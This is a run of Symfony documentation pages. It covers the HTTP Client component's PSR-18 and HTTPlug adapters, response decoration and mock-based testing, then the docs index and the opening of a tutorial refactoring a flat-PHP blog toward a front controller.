        $client = new Psr18Client();

        $request = $client->createRequest('GET', 'https://symfony.com/versions.json');
        $response = $client->sendRequest($request);

        $content = json_decode($response->getBody()->getContents(), true);

You can also pass a set of default options to your client thanks to the
``Psr18Client::withOptions()`` method::

    use Symfony\Component\HttpClient\Psr18Client;

    $client = (new Psr18Client())
        ->withOptions([
            'base_uri' => 'https://symfony.com',
            'headers' => [
                'Accept' => 'application/json',
            ],
        ]);

    $request = $client->createRequest('GET', '/versions.json');

    // ...

HTTPlug
~~~~~~~

The `HTTPlug`_ v1 specification was published before PSR-18 and is superseded by
it. As such, you should not use it in newly written code. The component is still
interoperable with libraries that require it thanks to the
:class:`Symfony\\Component\\HttpClient\\HttplugClient` class. Similarly to
:class:`Symfony\\Component\\HttpClient\\Psr18Client` implementing relevant parts of PSR-17,
:class:`Symfony\\Component\\HttpClient\\HttplugClient` also implements the factory methods
defined in the related ``php-http/message-factory`` package.

.. code-block:: terminal

    # Let's suppose php-http/httplug is already required by the lib you want to use

    # installs an efficient implementation of response and stream factories
    # with autowiring aliases provided by Symfony Flex
    $ composer require nyholm/psr7

    # alternatively, install the php-http/discovery package to auto-discover
    # any already installed implementations from common vendors:
    # composer require php-http/discovery

Let's say you want to instantiate a class with the following constructor,
that requires HTTPlug dependencies::

    use Http\Client\HttpClient;
    use Http\Message\StreamFactory;

    class SomeSdk
    {
        public function __construct(
            HttpClient $httpClient,
            StreamFactory $streamFactory
        )
        // [...]
    }

Because :class:`Symfony\\Component\\HttpClient\\HttplugClient` implements these
interfaces,you can use it this way::

    use Symfony\Component\HttpClient\HttplugClient;

    $httpClient = new HttplugClient();
    $apiClient = new SomeSdk($httpClient, $httpClient);

If you'd like to work with promises, :class:`Symfony\\Component\\HttpClient\\HttplugClient`
also implements the ``HttpAsyncClient`` interface. To use it, you need to install the
``guzzlehttp/promises`` package:

.. code-block:: terminal

    $ composer require guzzlehttp/promises

Then you're ready to go::

    use Psr\Http\Message\ResponseInterface;
    use Symfony\Component\HttpClient\HttplugClient;

    $httpClient = new HttplugClient();
    $request = $httpClient->createRequest('GET', 'https://my.api.com/');
    $promise = $httpClient->sendAsyncRequest($request)
        ->then(
            function (ResponseInterface $response): ResponseInterface {
                echo 'Got status '.$response->getStatusCode();

                return $response;
            },
            function (\Throwable $exception): never {
                echo 'Error: '.$exception->getMessage();

                throw $exception;
            }
        );

    // after you're done with sending several requests,
    // you must wait for them to complete concurrently

    // wait for a specific promise to resolve while monitoring them all
    $response = $promise->wait();

    // wait maximum 1 second for pending promises to resolve
    $httpClient->wait(1.0);

    // wait for all remaining promises to resolve
    $httpClient->wait();

You can also pass a set of default options to your client thanks to the
``HttplugClient::withOptions()`` method::

    use Psr\Http\Message\ResponseInterface;
    use Symfony\Component\HttpClient\HttplugClient;

    $httpClient = (new HttplugClient())
        ->withOptions([
            'base_uri' => 'https://my.api.com',
        ]);
    $request = $httpClient->createRequest('GET', '/');

    // ...

Native PHP Streams
~~~~~~~~~~~~~~~~~~

Responses implementing :class:`Symfony\\Contracts\\HttpClient\\ResponseInterface`
can be cast to native PHP streams with
:method:`Symfony\\Component\\HttpClient\\Response\\StreamWrapper::createResource`.
This allows using them where native PHP streams are needed::

    use Symfony\Component\HttpClient\HttpClient;
    use Symfony\Component\HttpClient\Response\StreamWrapper;

    $client = HttpClient::create();
    $response = $client->request('GET', 'https://symfony.com/versions.json');

    $streamResource = StreamWrapper::createResource($response, $client);

    // alternatively and contrary to the previous one, this returns
    // a resource that is seekable and potentially stream_select()-able
    $streamResource = $response->toStream();

    echo stream_get_contents($streamResource); // outputs the content of the response

    // later on if you need to, you can access the response from the stream
    $response = stream_get_meta_data($streamResource)['wrapper_data']->getResponse();

Extensibility
-------------

If you want to extend the behavior of a base HTTP client, you can use
:doc:`service decoration </service_container/service_decoration>`::

    class MyExtendedHttpClient implements HttpClientInterface
    {
        public function __construct(
            private ?HttpClientInterface $decoratedClient = null
        ) {
            $this->decoratedClient ??= HttpClient::create();
        }

        public function request(string $method, string $url, array $options = []): ResponseInterface
        {
            // process and/or change the $method, $url and/or $options as needed
            $response = $this->decoratedClient->request($method, $url, $options);

            // if you call here any method on $response, the HTTP request
            // won't be async; see below for a better way

            return $response;
        }

        public function stream($responses, ?float $timeout = null): ResponseStreamInterface
        {
            return $this->decoratedClient->stream($responses, $timeout);
        }
    }

A decorator like this one is useful in cases where processing the requests'
arguments is enough. By decorating the ``on_progress`` option, you can
even implement basic monitoring of the response. However, since calling
responses' methods forces synchronous operations, doing so inside ``request()``
will break async.

The solution is to also decorate the response object itself.
:class:`Symfony\\Component\\HttpClient\\TraceableHttpClient` and
:class:`Symfony\\Component\\HttpClient\\Response\\TraceableResponse` are good
examples as a starting point.

In order to help writing more advanced response processors, the component provides
an :class:`Symfony\\Component\\HttpClient\\AsyncDecoratorTrait`. This trait allows
processing the stream of chunks as they come back from the network::

    class MyExtendedHttpClient implements HttpClientInterface
    {
        use AsyncDecoratorTrait;

        public function request(string $method, string $url, array $options = []): ResponseInterface
        {
            // process and/or change the $method, $url and/or $options as needed

            $passthru = function (ChunkInterface $chunk, AsyncContext $context): \Generator {
                // do what you want with chunks, e.g. split them
                // in smaller chunks, group them, skip some, etc.

                yield $chunk;
            };

            return new AsyncResponse($this->client, $method, $url, $options, $passthru);
        }
    }

Because the trait already implements a constructor and the ``stream()`` method,
you don't need to add them. The ``request()`` method should still be defined;
it shall return an
:class:`Symfony\\Component\\HttpClient\\Response\\AsyncResponse`.

The custom processing of chunks should happen in ``$passthru``: this generator
is where you need to write your logic. It will be called for each chunk yielded
by the underlying client. A ``$passthru`` that does nothing would just ``yield
$chunk;``. You could also yield a modified chunk, split the chunk into many
ones by yielding several times, or even skip a chunk altogether by issuing a
``return;`` instead of yielding.

In order to control the stream, the chunk passthru receives an
:class:`Symfony\\Component\\HttpClient\\Response\\AsyncContext` as second
argument. This context object has methods to read the current state of the
response. It also allows altering the response stream with methods to create
new chunks of content, pause the stream, cancel the stream, change the info of
the response, replace the current request by another one or change the chunk
passthru itself.

Checking the test cases implemented in
:class:`Symfony\\Component\\HttpClient\\Tests\\AsyncDecoratorTraitTest`
might be a good start to get various working examples for a better understanding.
Here are the use cases that it simulates:

* retry a failed request;
* send a preflight request, e.g. for authentication needs;
* issue subrequests and include their content in the main response's body.

The logic in :class:`Symfony\\Component\\HttpClient\\Response\\AsyncResponse`
has many safety checks that will throw a ``LogicException`` if the chunk
passthru doesn't behave correctly; e.g. if a chunk is yielded after an ``isLast()``
one, or if a content chunk is yielded before an ``isFirst()`` one, etc.

Testing
-------

This component includes the :class:`Symfony\\Component\\HttpClient\\MockHttpClient`
and :class:`Symfony\\Component\\HttpClient\\Response\\MockResponse` classes to use
in tests that shouldn't make actual HTTP requests. Such tests can be useful, as they
will run faster and produce consistent results, since they're not dependent on an
external service. By not making actual HTTP requests there is no need to worry about
the service being online or the request changing state, for example deleting
a resource.

:class:`Symfony\\Component\\HttpClient\\MockHttpClient` implements the
:class:`Symfony\\Contracts\\HttpClient\\HttpClientInterface`, just like any actual
HTTP client in this component. When you type-hint with
:class:`Symfony\\Contracts\\HttpClient\\HttpClientInterface` your code will accept
the real client outside tests, while replacing it with
:class:`Symfony\\Component\\HttpClient\\MockHttpClient` in the test.

When the ``request`` method is used on :class:`Symfony\\Component\\HttpClient\\MockHttpClient`,
it will respond with the supplied
:class:`Symfony\\Component\\HttpClient\\Response\\MockResponse`. There are a few ways to use
it, as described below.

HTTP Client and Responses
~~~~~~~~~~~~~~~~~~~~~~~~~

The first way of using :class:`Symfony\\Component\\HttpClient\\MockHttpClient`
is to pass a list of responses to its constructor. These will be yielded
in order when requests are made::

    use Symfony\Component\HttpClient\MockHttpClient;
    use Symfony\Component\HttpClient\Response\MockResponse;

    $responses = [
        new MockResponse($body1, $info1),
        new MockResponse($body2, $info2),
    ];

    $client = new MockHttpClient($responses);
    // responses are returned in the same order as passed to MockHttpClient
    $response1 = $client->request('...'); // returns $responses[0]
    $response2 = $client->request('...'); // returns $responses[1]

It is also possible to create a
:class:`Symfony\\Component\\HttpClient\\Response\\MockResponse` directly
from a file, which is particularly useful when storing your response
snapshots in files::

    use Symfony\Component\HttpClient\Response\MockResponse;

    $response = MockResponse::fromFile('tests/fixtures/response.xml');

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\HttpClient\\Response\\MockResponse::fromFile`
    method was introduced in Symfony 7.1.

Another way of using :class:`Symfony\\Component\\HttpClient\\MockHttpClient` is to
pass a callback that generates the responses dynamically when it's called::

    use Symfony\Component\HttpClient\MockHttpClient;
    use Symfony\Component\HttpClient\Response\MockResponse;

    $callback = function ($method, $url, $options): MockResponse {
        return new MockResponse('...');
    };

    $client = new MockHttpClient($callback);
    $response = $client->request('...'); // calls $callback to get the response

You can also pass a list of callbacks if you need to perform specific
assertions on the request before returning the mocked response::

    $expectedRequests = [
        function ($method, $url, $options): MockResponse {
            $this->assertSame('GET', $method);
            $this->assertSame('https://example.com/api/v1/customer', $url);

            return new MockResponse('...');
        },
        function ($method, $url, $options): MockResponse {
            $this->assertSame('POST', $method);
            $this->assertSame('https://example.com/api/v1/customer/1/products', $url);

            return new MockResponse('...');
        },
    ];

    $client = new MockHttpClient($expectedRequests);

    // ...

.. tip::

    Instead of using the first argument, you can also set the (list of)
    responses or callbacks using the
    :method:`Symfony\\Component\\HttpClient\\MockHttpClient::setResponseFactory`
    method::

        $responses = [
            new MockResponse($body1, $info1),
            new MockResponse($body2, $info2),
        ];

        $client = new MockHttpClient();
        $client->setResponseFactory($responses);

If you need to test responses with HTTP status codes different than 200,
define the ``http_code`` option::

    use Symfony\Component\HttpClient\MockHttpClient;
    use Symfony\Component\HttpClient\Response\MockResponse;

    $client = new MockHttpClient([
        new MockResponse('...', ['http_code' => 500]),
        new MockResponse('...', ['http_code' => 404]),
    ]);

    $response = $client->request('...');

The responses provided to the mock client don't have to be instances of
:class:`Symfony\\Component\\HttpClient\\Response\\MockResponse`. Any class
implementing :class:`Symfony\\Contracts\\HttpClient\\ResponseInterface`
will work (e.g. ``$this->createMock(ResponseInterface::class)``).

However, using :class:`Symfony\\Component\\HttpClient\\Response\\MockResponse`
allows simulating chunked responses and timeouts::

    $body = function (): \Generator {
        yield 'hello';
        // empty strings are turned into timeouts so that they are easy to test
        yield '';
        yield 'world';
    };

    $mockResponse = new MockResponse($body());

Finally, you can also create an invokable or iterable class that generates the
responses and use it as a callback in functional tests::

    namespace App\Tests;

    use Symfony\Component\HttpClient\Response\MockResponse;
    use Symfony\Contracts\HttpClient\ResponseInterface;

    class MockClientCallback
    {
        public function __invoke(string $method, string $url, array $options = []): ResponseInterface
        {
            // load a fixture file or generate data
            // ...
            return new MockResponse($data);
        }
    }

Then configure Symfony to use your callback:

.. configuration-block::

    .. code-block:: yaml

        # config/services_test.yaml
        services:
            # ...
            App\Tests\MockClientCallback: ~

        # config/packages/test/framework.yaml
        framework:
            http_client:
                mock_response_factory: App\Tests\MockClientCallback

    .. code-block:: xml

        <!-- config/services_test.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema-instance"
            xsd:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Tests\MockClientCallback"/>
            </services>
        </container>

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:http-client mock-response-factory="App\Tests\MockClientCallback">
                    <!-- ... -->
                </framework-http-client>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->httpClient()
                ->mockResponseFactory(MockClientCallback::class)
            ;
        };

To return json, you would normally do::

    use Symfony\Component\HttpClient\Response\MockResponse;

    $response = new MockResponse(json_encode([
            'foo' => 'bar',
        ]), [
        'response_headers' => [
            'content-type' => 'application/json',
        ],
    ]);

You can use :class:`Symfony\\Component\\HttpClient\\Response\\JsonMockResponse` instead::

    use Symfony\Component\HttpClient\Response\JsonMockResponse;

    $response = new JsonMockResponse([
        'foo' => 'bar',
    ]);

Just like :class:`Symfony\\Component\\HttpClient\\Response\\MockResponse`, you can
also create a :class:`Symfony\\Component\\HttpClient\\Response\\JsonMockResponse`
directly from a file::

    use Symfony\Component\HttpClient\Response\JsonMockResponse;

    $response = JsonMockResponse::fromFile('tests/fixtures/response.json');

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\HttpClient\\Response\\JsonMockResponse::fromFile`
    method was introduced in Symfony 7.1.

Testing Request Data
~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\HttpClient\\Response\\MockResponse` class comes
with some helper methods to test the request:

* ``getRequestMethod()`` - returns the HTTP method;
* ``getRequestUrl()`` - returns the URL the request would be sent to;
* ``getRequestOptions()`` - returns an array containing other information about
  the request such as headers, query parameters, body content etc.

Usage example::

    $mockResponse = new MockResponse('', ['http_code' => 204]);
    $httpClient = new MockHttpClient($mockResponse, 'https://example.com');

    $response = $httpClient->request('DELETE', 'api/article/1337', [
        'headers' => [
            'Accept: */*',
            'Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l',
        ],
    ]);

    $mockResponse->getRequestMethod();
    // returns "DELETE"

    $mockResponse->getRequestUrl();
    // returns "https://example.com/api/article/1337"

    $mockResponse->getRequestOptions()['headers'];
    // returns ["Accept: */*", "Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"]

Full Example
~~~~~~~~~~~~

The following standalone example demonstrates a way to use the HTTP client and
test it in a real application::

    // ExternalArticleService.php
    use Symfony\Contracts\HttpClient\HttpClientInterface;

    final class ExternalArticleService
    {
        public function __construct(
            private HttpClientInterface $httpClient,
        ) {
        }

        public function createArticle(array $requestData): array
        {
            $requestJson = json_encode($requestData, JSON_THROW_ON_ERROR);

            $response = $this->httpClient->request('POST', 'api/article', [
                'headers' => [
                    'Content-Type: application/json',
                    'Accept: application/json',
                ],
                'body' => $requestJson,
            ]);

            if (201 !== $response->getStatusCode()) {
                throw new Exception('Response status code is different than expected.');
            }

            // ... other checks

            $responseJson = $response->getContent();
            $responseData = json_decode($responseJson, true, 512, JSON_THROW_ON_ERROR);

            return $responseData;
        }
    }

    // ExternalArticleServiceTest.php
    use PHPUnit\Framework\TestCase;
    use Symfony\Component\HttpClient\MockHttpClient;
    use Symfony\Component\HttpClient\Response\MockResponse;

    final class ExternalArticleServiceTest extends TestCase
    {
        public function testSubmitData(): void
        {
            // Arrange
            $requestData = ['title' => 'Testing with Symfony HTTP Client'];
            $expectedRequestData = json_encode($requestData, JSON_THROW_ON_ERROR);

            $expectedResponseData = ['id' => 12345];
            $mockResponseJson = json_encode($expectedResponseData, JSON_THROW_ON_ERROR);
            $mockResponse = new MockResponse($mockResponseJson, [
                'http_code' => 201,
                'response_headers' => ['Content-Type: application/json'],
            ]);

            $httpClient = new MockHttpClient($mockResponse, 'https://example.com');
            $service = new ExternalArticleService($httpClient);

            // Act
            $responseData = $service->createArticle($requestData);

            // Assert
            self::assertSame('POST', $mockResponse->getRequestMethod());
            self::assertSame('https://example.com/api/article', $mockResponse->getRequestUrl());
            self::assertContains(
                'Content-Type: application/json',
                $mockResponse->getRequestOptions()['headers']
            );
            self::assertSame($expectedRequestData, $mockResponse->getRequestOptions()['body']);

            self::assertSame($responseData, $expectedResponseData);
        }
    }

Testing Using HAR Files
~~~~~~~~~~~~~~~~~~~~~~~

Modern browsers (via their network tab) and HTTP clients allow to export the
information of one or more HTTP requests using the `HAR`_ (HTTP Archive) format.
You can use those ``.har`` files to perform tests with Symfony's HTTP Client.

First, use a browser or HTTP client to perform the HTTP request(s) you want to
test. Then, save that information as a ``.har`` file somewhere in your application::

    // ExternalArticleServiceTest.php
    use PHPUnit\Framework\TestCase;
    use Symfony\Component\HttpClient\MockHttpClient;
    use Symfony\Component\HttpClient\Response\MockResponse;

    final class ExternalArticleServiceTest extends TestCase
    {
        public function testSubmitData(): void
        {
            // Arrange
            $fixtureDir = sprintf('%s/tests/fixtures/HTTP', static::getContainer()->getParameter('kernel.project_dir'));
            $factory = new HarFileResponseFactory("$fixtureDir/example.com_archive.har");
            $httpClient = new MockHttpClient($factory, 'https://example.com');
            $service = new ExternalArticleService($httpClient);

            // Act
            $responseData = $service->createArticle($requestData);

            // Assert
            self::assertSame($responseData, 'the expected response');
        }
    }

If your service performs multiple requests or if your ``.har`` file contains multiple
request/response pairs, the :class:`Symfony\\Component\\HttpClient\\Test\\HarFileResponseFactory`
will find the associated response based on the request method, URL and body (if any).
Note that **this won't work** if the request body or URI is random / always
changing (e.g. if it contains current date or random UUIDs).

Testing Network Transport Exceptions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

As explained in the :ref:`Network Errors section <http-client_network-errors>`,
when making HTTP requests you might face errors at transport level.

That's why it's useful to test how your application behaves in case of a transport
error. :class:`Symfony\\Component\\HttpClient\\Response\\MockResponse` allows
you to do so, by yielding the exception from its body::

    // ExternalArticleServiceTest.php
    use PHPUnit\Framework\TestCase;
    use Symfony\Component\HttpClient\MockHttpClient;
    use Symfony\Component\HttpClient\Response\MockResponse;

    final class ExternalArticleServiceTest extends TestCase
    {
        // ...

        public function testTransportLevelError(): void
        {
            $requestData = ['title' => 'Testing with Symfony HTTP Client'];
            $httpClient = new MockHttpClient([
                // You can create the exception directly in the body...
                new MockResponse([new \RuntimeException('Error at transport level')]),

                // ... or you can yield the exception from a callback
                new MockResponse((static function (): \Generator {
                    yield new TransportException('Error at transport level');
                })()),
            ]);

            $service = new ExternalArticleService($httpClient);

            try {
                $service->createArticle($requestData);

                // An exception should have been thrown in `createArticle()`, so this line should never be reached
                $this->fail();
            } catch (TransportException $e) {
                $this->assertEquals(new \RuntimeException('Error at transport level'), $e->getPrevious());
                $this->assertSame('Error at transport level', $e->getMessage());
            }
        }
    }

.. _`cURL PHP extension`: https://www.php.net/curl
.. _`Zlib PHP extension`: https://www.php.net/zlib
.. _`PSR-17`: https://www.php-fig.org/psr/psr-17/
.. _`PSR-18`: https://www.php-fig.org/psr/psr-18/
.. _`HTTPlug`: https://github.com/php-http/httplug/#readme
.. _`Symfony Contracts`: https://github.com/symfony/contracts
.. _`libcurl`: https://curl.haxx.se/libcurl/
.. _`amphp/http-client`: https://packagist.org/packages/amphp/http-client
.. _`cURL options`: https://www.php.net/manual/en/function.curl-setopt.php
.. _`Server-sent events`: https://html.spec.whatwg.org/multipage/server-sent-events.html
.. _`EventSource`: https://www.w3.org/TR/eventsource/#eventsource
.. _`idempotent method`: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Idempotent_methods
.. _`SSRF`: https://portswigger.net/web-security/ssrf
.. _`RFC 6570`: https://www.rfc-editor.org/rfc/rfc6570
.. _`HAR`: https://w3c.github.io/web-performance/specs/HAR/Overview.html
.. _symfony2-documentation:

Symfony Documentation
=====================

Quick Tour
----------

Get started fast with the Symfony :doc:`Quick Tour <quick_tour/index>`:

* :doc:`quick_tour/the_big_picture`
* :doc:`quick_tour/flex_recipes`
* :doc:`quick_tour/the_architecture`

Getting Started
---------------

.. toctree::
    :maxdepth: 2

    getting_started/index

Topics
------

.. toctree::
    :maxdepth: 1

    best_practices
    bundles
    cache
    console
    doctrine
    deployment
    event_dispatcher
    forms
    frontend
    html_sanitizer
    http_cache
    http_client
    lock
    logging
    mailer
    mercure
    messenger
    migration
    notifier
    performance
    profiler
    rate_limiter
    routing
    security
    session
    setup
    serializer
    service_container
    testing
    translation
    validation
    web_link
    webhook
    workflow

Components
----------

Read the :doc:`Components </components/>` documentation.

Reference Documents
-------------------

Get answers quickly with reference documents:

.. include:: /reference/map.rst.inc

Contributing
------------

Contribute to Symfony:

.. include:: /contributing/map.rst.inc

Create your Own Framework
-------------------------

Want to create your own framework based on Symfony?

.. toctree::
   :maxdepth: 2

   create_framework/index
.. _symfony2-versus-flat-php:

Symfony versus Flat PHP
=======================

**Why is Symfony better than just opening up a file and writing flat PHP?**

If you've never used a PHP framework, aren't familiar with the
`Model-View-Controller`_ (MVC) philosophy, or just wonder what all the *hype*
is around Symfony, this article is for you. Instead of *telling* you that
Symfony allows you to develop faster and better software than with flat PHP,
you'll see for yourself.

In this article, you'll write a basic application in flat PHP, and then
refactor it to be more organized. You'll travel through time, seeing the
decisions behind why web development has evolved over the past several years
to where it is now.

By the end, you'll see how Symfony can rescue you from mundane tasks and
let you take back control of your code.

A Basic Blog in Flat PHP
------------------------

In this article, you'll build the token blog application using only flat PHP.
To begin, create a single page that displays blog entries that have been
persisted to the database. Writing in flat PHP is quick and dirty:

.. code-block:: html+php

    <?php
    // index.php
    $connection = new PDO("mysql:host=localhost;dbname=blog_db", 'myuser', 'mypassword');

    $result = $connection->query('SELECT id, title FROM post');
    ?>

    <!DOCTYPE html>
    <html>
        <head>
            <title>List of Posts</title>
        </head>
        <body>
            <h1>List of Posts</h1>
            <ul>
                <?php while ($row = $result->fetch(PDO::FETCH_ASSOC)): ?>
                <li>
                    <a href="/show.php?id=<?= $row['id'] ?>">
                        <?= $row['title'] ?>
                    </a>
                </li>
                <?php endwhile ?>
            </ul>
        </body>
    </html>

    <?php
    $connection = null;
    ?>

That's quick to write, fast to deploy and run, and, as your app grows, impossible
to maintain. There are several problems that need to be addressed:

* **No error-checking**: What if the connection to the database fails?

* **Poor organization**: If the application grows, this single file will become
  increasingly unmaintainable. Where should you put code to handle a form
  submission? How can you validate data? Where should code go for sending
  emails?

* **Difficult to reuse code**: Since everything is in one file, there's no
  way to reuse any part of the application for other "pages" of the blog.

.. note::

    Another problem not mentioned here is the fact that the database is
    tied to MySQL. Though not covered here, Symfony fully integrates `Doctrine`_,
    a library dedicated to database abstraction and mapping.

Isolating the Presentation
~~~~~~~~~~~~~~~~~~~~~~~~~~

The code can immediately gain from separating the application "logic" from
the code that prepares the HTML "presentation"::

    // index.php
    $connection = new PDO("mysql:host=localhost;dbname=blog_db", 'myuser', 'mypassword');

    $result = $connection->query('SELECT id, title FROM post');

    $posts = [];
    while ($row = $result->fetch(PDO::FETCH_ASSOC)) {
        $posts[] = $row;
    }

    $connection = null;

    // include the HTML presentation code
    require 'templates/list.php';

The HTML code is now stored in a separate file ``templates/list.php``, which
is primarily an HTML file that uses a template-like PHP syntax:

.. code-block:: html+php

    <!-- templates/list.php -->
    <!DOCTYPE html>
    <html>
        <head>
            <title>List of Posts</title>
        </head>
        <body>
            <h1>List of Posts</h1>
            <ul>
                <?php foreach ($posts as $post): ?>
                <li>
                    <a href="/show.php?id=<?= $post['id'] ?>">
                        <?= $post['title'] ?>
                    </a>
                </li>
                <?php endforeach ?>
            </ul>
        </body>
    </html>

By convention, the file that contains all the application logic - ``index.php`` -
is known as a "controller". The term controller is a word you'll hear a lot,
regardless of the language or framework you use. It refers to the area
of *your* code that processes user input and prepares the response.

In this case, the controller prepares data from the database and then includes
a template to present that data. With the controller isolated, you could
change *just* the template file if you needed to render the blog
entries in some other format (e.g. ``list.json.php`` for JSON format).

Isolating the Application (Domain) Logic
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

So far the application contains only one page. But what if a second page
needed to use the same database connection, or even the same array of blog
posts? Refactor the code so that the core behavior and data-access functions
of the application are isolated in a new file called ``model.php``::

    // model.php
    function open_database_connection()
    {
        $connection = new PDO("mysql:host=localhost;dbname=blog_db", 'myuser', 'mypassword');

        return $connection;
    }

    function close_database_connection(&$connection)
    {
        $connection = null;
    }

    function get_all_posts()
    {
        $connection = open_database_connection();

        $result = $connection->query('SELECT id, title FROM post');

        $posts = [];
        while ($row = $result->fetch(PDO::FETCH_ASSOC)) {
            $posts[] = $row;
        }
        close_database_connection($connection);

        return $posts;
    }

.. tip::

    The filename ``model.php`` is used because the logic and data access of
    an application is traditionally known as the "model" layer. In a well-organized
    application, the majority of the code representing your "business logic"
    should live in the model (as opposed to living in a controller). And unlike
    in this example, only a portion (or none) of the model is actually concerned
    with accessing a database.

The controller (``index.php``) is now only a few lines of code::

    // index.php
    require_once 'model.php';

    $posts = get_all_posts();

    require 'templates/list.php';

Now, the sole task of the controller is to get data from the model layer of
the application (the model) and to call a template to render that data.
This is a very concise example of the model-view-controller pattern.

Isolating the Layout
~~~~~~~~~~~~~~~~~~~~

At this point, the application has been refactored into three distinct pieces
offering various advantages and the opportunity to reuse almost everything
on different pages.

The only part of the code that *can't* be reused is the page layout. Fix
that by creating a new ``templates/layout.php`` file:

.. code-block:: html+php

    <!-- templates/layout.php -->
    <!DOCTYPE html>
    <html>
        <head>
            <title><?= $title ?></title>
        </head>
        <body>
            <?= $content ?>
        </body>
    </html>

The template ``templates/list.php`` can now be simplified to "extend"
the ``templates/layout.php``:

.. code-block:: html+php

    <!-- templates/list.php -->
    <?php $title = 'List of Posts' ?>

    <?php ob_start() ?>
        <h1>List of Posts</h1>
        <ul>
            <?php foreach ($posts as $post): ?>
            <li>
                <a href="/show.php?id=<?= $post['id'] ?>">
                    <?= $post['title'] ?>
                </a>
            </li>
            <?php endforeach ?>
        </ul>
    <?php $content = ob_get_clean() ?>

    <?php include 'layout.php' ?>

You now have a setup that will allow you to reuse the layout.
Unfortunately, to accomplish this, you're forced to use a few ugly
PHP functions (``ob_start()``, ``ob_get_clean()``) in the template. Symfony
solves this using `Twig`_. You'll see it in action shortly.

Adding a Blog "show" Page
-------------------------

The blog "list" page has now been refactored so that the code is better-organized
and reusable. To prove it, add a blog "show" page, which displays an individual
blog post identified by an ``id`` query parameter.

To begin, create a new function in the ``model.php`` file that retrieves
an individual blog result based on a given id::

    // model.php
    function get_post_by_id($id)
    {
        $connection = open_database_connection();

        $query = 'SELECT created_at, title, body FROM post WHERE id=:id';
        $statement = $connection->prepare($query);
        $statement->bindValue(':id', $id, PDO::PARAM_INT);
        $statement->execute();

        $row = $statement->fetch(PDO::FETCH_ASSOC);

        close_database_connection($connection);

        return $row;
    }

Next, create a new file called ``show.php`` - the controller for this new
page::

    // show.php
    require_once 'model.php';

    $post = get_post_by_id($_GET['id']);

    require 'templates/show.php';

Finally, create the new template file - ``templates/show.php`` - to render
the individual blog post:

.. code-block:: html+php

    <!-- templates/show.php -->
    <?php $title = $post['title'] ?>

    <?php ob_start() ?>
        <h1><?= $post['title'] ?></h1>

        <div class="date"><?= $post['created_at'] ?></div>
        <div class="body">
            <?= $post['body'] ?>
        </div>
    <?php $content = ob_get_clean() ?>

    <?php include 'layout.php' ?>

Creating the second page now requires very little work and no code is duplicated. Still,
this page introduces even more lingering problems that a framework can solve
for you. For example, a missing or invalid ``id`` query parameter will cause
the page to crash. It would be better if this caused a 404 page to be rendered,
but this can't really be done yet.

Another major problem is that each individual controller file must include
the ``model.php`` file. What if each controller file suddenly needed to include
an additional file or perform some other global task (e.g. enforce security)?
As it stands now, that code would need to be added to every controller file.
If you forget to include something in one file, hopefully it doesn't relate
to security...

.. _from_flat_php-front-controller:

A "Front Controller" to the Rescue
----------------------------------

The solution is to use a front controller: a single PHP file through which
*all* requests are processed. With a front controller, the URIs for the
application change slightly, but start to become more flexible:

.. code-block:: text

    Without a front controller
    /index.php          => Blog post list page (index.php executed)
    /show.php           => Blog post show page (show.php executed)

    With index.php as the front controller
    /index.php          => Blog post list page (index.php executed)
    /index.php/show     => Blog post show page (index.php executed)

.. include:: /_includes/_rewrite_rule_tip.rst.inc

When using a front controller, a single PHP file (``index.php`` in this case)
renders *every* request. For the blog post show page, ``/index.php/show`` will
actually execute the ``index.php`` file, which is now responsible for routing
requests internally based on the full URI. As you'll see, a front controller
is a very powerful tool.

Creating the Front Controller
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You're about to take a **big** step with the application. With one file handling
all requests, you can centralize things such as security handling, configuration
loading, and routing. In this application, ``index.php`` must now be smart
enough to render the blog post list page *or* the blog post show page based
on the requested URI::

    // index.php

    // load and initialize any global libraries
    require_once 'model.php';
    require_once 'controllers.php';

    // route the request internally
    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    if ('/index.php' === $uri) {
        list_action();
    } elseif ('/index.php/show' === $uri && isset($_GET['id'])) {
        show_action($_GET['id']);
    } else {
        header('HTTP/1.1 404 Not Found');
        echo '<html><body><h1>Page Not Found</h1></body></html>';
    }

For organization, both controllers (formerly ``/index.php`` and ``/index.php/show``)
are now PHP functions and each has been moved into a separate file named ``controllers.php``::

    // controllers.php
    function list_action()
    {
        $posts = get_all_posts();
        require 'templates/list.php';
    }

    function show_action($id)
    {
        $post = get_post_by_id($id);
        require 'templates/show.php';
    }

As a front controller, ``index.php`` has taken on an entirely new role, one
that includes loading the core libraries and routing the application so that
one of the two controllers (the ``list_action()`` and ``show_action()``
functions) is called. In reality, the front controller is beginning to look and
act a lot like how Symfony handles and routes requests.

But be careful not to confuse the terms *front controller* and *controller*. Your
app will usually have only *one* front controller, which boots your code. You will
have *many* controller functions: one for each page.

.. tip::

    Another advantage of a front controller is flexible URLs. Notice that
    the URL to the blog post show page could be changed from ``/show`` to ``/read``
    by changing code in only one location. Before, an entire file needed to
    be renamed. In Symfony, URLs are even more flexible.

By now, the application has evolved from a single PHP file into a structure
that is organized and allows for code reuse. You should be happier, but far
from being satisfied. For example, the routing system is fickle, and wouldn't
